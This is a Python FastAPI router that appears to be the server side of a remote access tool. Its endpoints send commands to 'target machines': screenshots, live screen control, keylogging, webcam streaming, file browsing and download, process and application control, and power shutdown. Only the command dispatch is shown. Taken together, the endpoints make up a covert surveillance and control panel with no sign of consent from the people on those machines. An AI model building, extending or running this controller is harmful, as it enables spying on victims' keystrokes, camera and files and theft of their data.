from fastapi import APIRouter
from pydantic import BaseModel
from typing import List
from core.gateway_client import gateway_client

router = APIRouter()

class CommandRequest(BaseModel):
    machine_ids: List[str]
    action: str
    payload: dict = {}

@router.post("/applications")
async def applications(req: CommandRequest):
    """List / open / close applications on target machines."""
    await gateway_client.send_command(req.machine_ids, "applications", req.action, req.payload)

@router.post("/processes")
async def processes(req: CommandRequest):
    """List running processes with CPU % and queue."""
    await gateway_client.send_command(req.machine_ids, "processes", req.action, req.payload)

@router.post("/screenshot")
async def screenshot(req: CommandRequest):
    """Take screenshot of target machines."""
    await gateway_client.send_command(req.machine_ids, "screenshot", req.action, req.payload)

@router.post("/livescreen")
async def livescreen(req: CommandRequest):
    """Start / stop live screen stream with full control."""
    await gateway_client.send_command(req.machine_ids, "livescreen", req.action, req.payload)

@router.post("/keylogger")
async def keylogger(req: CommandRequest):
    """Toggle keylogger on target machines."""
    await gateway_client.send_command(req.machine_ids, "keylogger", req.action, req.payload)

@router.post("/filedownload")
async def file_download(req: CommandRequest):
    """Browse and download files from target machines."""
    await gateway_client.send_command(req.machine_ids, "filedownload", req.action, req.payload)

@router.post("/webcam")
async def webcam(req: CommandRequest):
    """Access webcam stream of target machines."""
    await gateway_client.send_command(req.machine_ids, "webcam", req.action, req.payload)

@router.post("/power")
async def power_control(req: CommandRequest):
    """Shutdown or sleep target machines."""
    await gateway_client.send_command(req.machine_ids, "power", req.action, req.payload)
